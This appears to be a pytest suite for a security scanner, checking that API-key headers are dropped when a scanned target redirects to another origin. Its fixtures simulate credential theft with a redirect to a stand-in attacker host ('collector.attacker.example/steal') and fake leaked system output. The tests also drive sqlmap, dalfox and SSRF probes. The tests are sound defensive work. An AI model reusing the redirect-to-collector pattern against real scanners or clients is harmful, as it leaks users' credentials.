"""Scanner requests that carry session credentials follow redirects only on their origin.

httpx, aiohttp, urllib and curl drop ``Authorization`` and ``Cookie`` when a redirect
changes host, but they copy every other request header. A scan configured with an API
key header (``X-API-Key`` and friends) therefore handed that key to whatever origin the
target named in ``Location``. These tests use a target that answers with a redirect to a
collector on a different origin and assert the collector never sees the secret, while a
same-origin redirect is still followed with the session attached.

The httpx sites run against ``httpx.MockTransport``; curl and aiohttp run against two
loopback servers (``127.0.0.1`` and ``localhost`` on different ports are different origins).
"""
from __future__ import annotations

import asyncio
import http.server
import os
import sys
import threading
from contextlib import contextmanager

import httpx
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scanner"))

from scanner_tools import active_checks, common, discovery, http_scanner, nuclei  # noqa: E402
from scanner_tools.auth_session import AuthConfig, AuthSession  # noqa: E402
from scanner_tools.request_meter import configure_request_meter  # noqa: E402

SECRET = "fixture-api-key-not-a-real-credential"
TARGET = "https://app.example"
COLLECTOR = "https://collector.attacker.example"


class _Session:
    """Unit fixture standing in for an authenticated scan session."""

    def __init__(self) -> None:
        self.config = AuthConfig(headers={"X-API-Key": SECRET}, validate_session=False)

    def export_session(self) -> dict:
        return {"headers": {"X-API-Key": SECRET}, "cookies": {}}


def _mock_target(seen: list[tuple[str, str, str | None]]):
    def handler(request: httpx.Request) -> httpx.Response:
        seen.append((request.method, str(request.url), request.headers.get("x-api-key")))
        if request.url.host == "collector.attacker.example":
            return httpx.Response(200, json={"links": []}, headers={"Allow": "GET, DELETE"})
        path = request.url.path
        if "cross" in path:
            return httpx.Response(302, headers={"Location": f"{COLLECTOR}/steal"})
        if "same" in path:
            return httpx.Response(307, headers={"Location": "/api/final.json"})
        return httpx.Response(200, json={"links": []}, headers={"Allow": "GET, POST"})

    return httpx.MockTransport(handler)


@pytest.fixture
def mock_httpx(monkeypatch):
    seen: list[tuple[str, str, str | None]] = []
    transport = _mock_target(seen)
    real = httpx.AsyncClient

    def factory(*args, **kwargs):
        kwargs["transport"] = transport
        return real(*args, **kwargs)

    monkeypatch.setattr(httpx, "AsyncClient", factory)
    return seen


def _collector_secrets(seen):
    return [entry for entry in seen if "collector.attacker.example" in entry[1] and entry[2]]


def test_follow_json_links_does_not_send_session_header_to_another_origin(mock_httpx):
    asyncio.run(discovery.follow_json_links(
        TARGET, [f"{TARGET}/api/cross.json", f"{TARGET}/api/same.json"], auth_session=_Session(),
    ))
    assert _collector_secrets(mock_httpx) == []
    # The same-origin redirect is still followed, with the session attached.
    assert ("GET", f"{TARGET}/api/final.json", SECRET) in mock_httpx


def test_discover_allowed_methods_does_not_send_session_header_to_another_origin(mock_httpx):
    result = asyncio.run(discovery.discover_allowed_methods(
        TARGET, [f"{TARGET}/api/cross", f"{TARGET}/api/same"], auth_session=_Session(),
    ))
    assert _collector_secrets(mock_httpx) == []
    assert ("OPTIONS", f"{TARGET}/api/final.json", SECRET) in mock_httpx
    assert f"{TARGET}/api/cross" not in result["methods_by_url"]


def test_probe_api_base_does_not_send_session_header_to_another_origin(mock_httpx, monkeypatch):
    monkeypatch.setattr(discovery, "WORDLIST_PATHS", {})
    asyncio.run(discovery.probe_api_base(TARGET, "/api/cross", auth_session=_Session(), limit=3))
    assert _collector_secrets(mock_httpx) == []


@contextmanager
def _servers():
    """A target on 127.0.0.1 and a collector on localhost (a different origin)."""
    collector_hits: list[tuple[str, str, dict[str, str]]] = []
    target_hits: list[tuple[str, str, dict[str, str]]] = []
    ports: dict[str, int] = {}

    class Collector(http.server.BaseHTTPRequestHandler):
        def _any(self):  # noqa: ANN202
            collector_hits.append((self.command, self.path, {k.lower(): v for k, v in self.headers.items()}))
            body = b"collected root:x: uid=0 gid=0"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_OPTIONS = do_TRACE = do_HEAD = _any

        def log_message(self, *_args):
            return None

    class Target(http.server.BaseHTTPRequestHandler):
        def _any(self):  # noqa: ANN202
            target_hits.append((self.command, self.path, {k.lower(): v for k, v in self.headers.items()}))
            length = int(self.headers.get("Content-Length") or 0)
            if length:
                self.rfile.read(length)
            if self.path.startswith("/cross"):
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{ports['collector']}/collect")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            if self.path.startswith("/same"):
                self.send_response(302)
                self.send_header("Location", "/final")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = b"final-body"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_OPTIONS = do_TRACE = do_HEAD = _any

        def log_message(self, *_args):
            return None

    try:
        collector = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Collector)
        target = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Target)
    except PermissionError:
        pytest.skip("test sandbox does not permit a loopback listener")
    ports["collector"] = collector.server_port
    threads = [threading.Thread(target=s.serve_forever, daemon=True) for s in (collector, target)]
    for thread in threads:
        thread.start()
    try:
        yield f"http://127.0.0.1:{target.server_port}", target_hits, collector_hits
    finally:
        for server in (collector, target):
            server.shutdown()
            server.server_close()
        for thread in threads:
            thread.join(timeout=2)


@pytest.fixture(autouse=True)
def _no_proxy(monkeypatch):
    for name in ("http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "all_proxy"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("NO_PROXY", "*")
    configure_request_meter(limit=None, target_host=None, mode="off")
    yield
    configure_request_meter(limit=None, target_host=None, mode="off")


def _leaked(collector_hits) -> list:
    return [hit for hit in collector_hits if SECRET in "".join(hit[2].values())]


def test_curl_with_session_header_stops_at_cross_origin_redirect():
    with _servers() as (target, _target_hits, collector_hits):
        out, _err, rc = asyncio.run(common.run(
            ["curl", "-sS", "-L", "-k", "--max-time", "5", "-H", f"X-API-Key: {SECRET}", f"{target}/cross"],
            timeout=10,
        ))
    assert rc == 0
    assert _leaked(collector_hits) == []
    assert "final-body" not in out


def test_curl_with_session_header_follows_same_origin_redirect():
    with _servers() as (target, target_hits, _collector_hits):
        out, err, rc = asyncio.run(common.run(
            ["curl", "-sS", "-i", "-L", "-k", "--max-time", "5", "-w", "\n%{http_code}",
             "-H", f"X-API-Key: {SECRET}", f"{target}/same"],
            timeout=10,
        ))
    assert rc == 0, err
    assert "__shakerscan" not in out and "__shakerscan" not in err
    # Both header blocks are kept, as curl -L -i prints them, and the body is the final one.
    assert out.count("HTTP/1.") == 2 and out.endswith("final-body\n200")
    assert ("GET", "/final", SECRET) in [(m, p, h.get("x-api-key")) for m, p, h in target_hits]


def test_curl_without_credentials_keeps_native_redirect_following():
    with _servers() as (target, _target_hits, collector_hits):
        out, _err, rc = asyncio.run(common.run(["curl", "-sS", "-L", "--max-time", "5", f"{target}/cross"], timeout=10))
    assert rc == 0 and "collected" in out and len(collector_hits) == 1


def test_auth_session_request_stops_at_cross_origin_redirect():
    with _servers() as (target, _target_hits, collector_hits):
        session = AuthSession(headers={"X-API-Key": SECRET}, config=AuthConfig(
            headers={"X-API-Key": SECRET}, validate_session=False, timeout=5,
        ))
        cross = asyncio.run(session.request("GET", f"{target}/cross"))
        same = asyncio.run(session.request("GET", f"{target}/same"))
    assert _leaked(collector_hits) == []
    assert cross["status"] == 302
    assert same["status"] == 200 and same["url"].endswith("/final")


def test_aiohttp_probes_with_session_headers_stop_at_cross_origin_redirect():
    pytest.importorskip("aiohttp")
    with _servers() as (target, _target_hits, collector_hits):
        asyncio.run(active_checks.advanced_vuln_tests(
            target, exploit_level="safe",
            candidates=[{"type": "ssrf", "url": f"{target}/cross?u=1", "param": "u"}],
            auth_session=_Session(),
        ))
        endpoints = [{"url": f"{target}/cross/{index}", "method": "GET", "source": "synthetic"} for index in range(6)]
        asyncio.run(active_checks._filter_reachable_active_endpoints(target, endpoints, auth_session=_Session()))
        headers = {"X-API-Key": SECRET}
        asyncio.run(http_scanner.detect_rate_limits(f"{target}/cross", headers=headers, requests_count=2, timeout=5))
        asyncio.run(http_scanner.test_verb_tampering(f"{target}/cross", headers=headers, timeout=5))
    assert _leaked(collector_hits) == []


def test_aiohttp_probe_with_session_headers_follows_same_origin_redirect():
    pytest.importorskip("aiohttp")
    with _servers() as (target, target_hits, _collector_hits):
        result = asyncio.run(http_scanner.detect_rate_limits(
            f"{target}/same", headers={"X-API-Key": SECRET}, requests_count=1, timeout=5,
        ))
    assert ("GET", "/final", SECRET) in [(m, p, h.get("x-api-key")) for m, p, h in target_hits]
    assert result["total_requests"] == 1


def test_external_tools_with_session_headers_do_not_follow_redirects(monkeypatch):
    commands: list[list[str]] = []

    async def fake_run(cmd, timeout=60, **_kwargs):
        commands.append(list(cmd))
        return "", "", 0

    monkeypatch.setattr(active_checks, "run", fake_run)
    asyncio.run(active_checks.dalfox_one(f"{TARGET}/q?x=1", quick_mode=False, auth_session=_Session()))
    asyncio.run(active_checks.sqlmap_test(f"{TARGET}/q?x=1", quick_mode=True, auth_session=_Session()))
    asyncio.run(active_checks.sqlmap_test_request_file("/nonexistent-request-file", quick_mode=True))
    dalfox, sqlmap, sqlmap_file = commands[:3]
    assert "--follow-redirects" not in dalfox
    assert "--ignore-redirects" in sqlmap and "--ignore-redirects" in sqlmap_file

    commands.clear()
    asyncio.run(active_checks.dalfox_one(f"{TARGET}/q?x=1", quick_mode=False, auth_session=None))
    assert "--follow-redirects" in commands[0]


def test_nuclei_with_session_headers_disables_redirects():
    assert nuclei.session_redirect_args(["-H", f"X-API-Key: {SECRET}"]) == ["-disable-redirects"]
    assert nuclei.session_redirect_args([]) == []


# --- what curl already protects, and which requests keep the client's own behaviour -----------

def test_curl_authorization_and_cookie_headers_rely_on_curls_own_stripping(monkeypatch):
    from scanner_tools import credential_redirects

    assert credential_redirects.curl_strips_credentials()  # this host's curl is 7.83.0 or later
    for args in (["-H", "Authorization: Bearer x"], ["-H", "Cookie: sid=x"], ["-u", "a:b"], ["--oauth2-bearer", "x"],
                 ["-b", "cookies.txt"]):
        assert not credential_redirects.curl_follows_with_credentials(["curl", "-L", *args, "https://a.example/"]), args
    for args in (["-H", "X-API-Key: x"], ["-b", "sid=x"], ["-H", "X-Auth-Token: x", "-H", "Authorization: x"]):
        assert credential_redirects.curl_follows_with_credentials(["curl", "-L", *args, "https://a.example/"]), args
    # A curl older than 7.83.0 copies those to another host or port: every one is material then.
    monkeypatch.setitem(credential_redirects._curl_versions, "curl", (7, 82, 0))
    for args in (["-H", "Authorization: Bearer x"], ["-H", "Cookie: sid=x"], ["-u", "a:b"], ["--oauth2-bearer", "x"]):
        assert credential_redirects.curl_follows_with_credentials(["curl", "-L", *args, "https://a.example/"]), args
    monkeypatch.setitem(credential_redirects._curl_versions, "curl", None)  # unreadable: strict
    assert credential_redirects.curl_follows_with_credentials(["curl", "-L", "-u", "a:b", "https://a.example/"])


def test_curl_authorization_header_is_not_sent_to_another_origin_by_curl_itself():
    with _servers() as (target, _target_hits, collector_hits):
        out, _err, rc = asyncio.run(common.run(
            ["curl", "-sS", "-L", "--max-time", "5", "-H", f"Authorization: Bearer {SECRET}", f"{target}/cross"],
            timeout=10,
        ))
    assert rc == 0 and "collected" in out  # followed by curl itself
    assert _leaked(collector_hits) == []


def test_same_host_upgrade_to_https_on_default_ports_keeps_credentials():
    from scanner_tools.credential_redirects import same_credential_origin

    assert same_credential_origin("http://a.example/x", "https://a.example/y")
    assert same_credential_origin("http://a.example:80/x", "https://a.example:443/y")
    assert not same_credential_origin("http://a.example:8080/", "https://a.example/")
    assert not same_credential_origin("http://a.example/", "https://a.example:8443/")
    assert not same_credential_origin("https://a.example/", "http://a.example/")
    assert not same_credential_origin("http://a.example/", "https://www.a.example/")


def test_unauthenticated_httpx_probes_keep_the_clients_redirects(mock_httpx):
    asyncio.run(discovery.follow_json_links(TARGET, [f"{TARGET}/api/cross.json"], auth_session=None))
    # No session material: the client follows as it always did (http->https, apex->www ...).
    assert any("collector.attacker.example" in url for _method, url, _key in mock_httpx)


def test_race_condition_burst_with_session_headers_stops_at_cross_origin_redirect():
    pytest.importorskip("aiohttp")
    from scanner_tools import race_condition_tests

    with _servers() as (target, _target_hits, collector_hits):
        asyncio.run(race_condition_tests.send_concurrent_requests(
            f"{target}/cross", "GET", {"X-API-Key": SECRET}, None, 2, 5,
        ))
    assert _leaked(collector_hits) == []


def test_dalfox_with_session_headers_never_runs_its_unproxied_headless_browser(monkeypatch):
    commands: list[list[str]] = []

    async def fake_run(cmd, timeout=60, **_kwargs):
        commands.append(list(cmd))
        return "", "", 0

    monkeypatch.setattr(active_checks, "run", fake_run)
    with_session = asyncio.run(active_checks.dalfox_one(
        f"{TARGET}/q?x=1", quick_mode=False, auth_session=_Session(), deep_domxss=True))
    assert "--deep-domxss" not in commands[0] and "--skip-headless" in commands[0]
    assert with_session["coverage_reasons"] == ["session_header_withheld_from_headless"]
    commands.clear()
    anonymous = asyncio.run(active_checks.dalfox_one(f"{TARGET}/q?x=1", quick_mode=False, deep_domxss=True))
    assert "--deep-domxss" in commands[0] and "--skip-headless" not in commands[0]
    assert "coverage_reasons" not in anonymous


def test_the_curl_version_is_read_off_the_event_loop(monkeypatch):
    import threading
    from scanner_tools import credential_redirects

    threads: list[str] = []
    real = credential_redirects.curl_version

    def recording(binary="curl"):
        threads.append(threading.current_thread().name)
        return real(binary)

    monkeypatch.setattr(credential_redirects, "_curl_versions", {})
    monkeypatch.setattr(credential_redirects, "curl_version", recording)

    async def scenario():
        loop_thread = threading.current_thread().name
        await common.run(["curl", "-sS", "-L", "--max-time", "1", "-H", "X-API-Key: x", "http://127.0.0.1:9/"], timeout=5)
        return loop_thread

    loop_thread = asyncio.run(scenario())
    assert threads and threads[0] != loop_thread
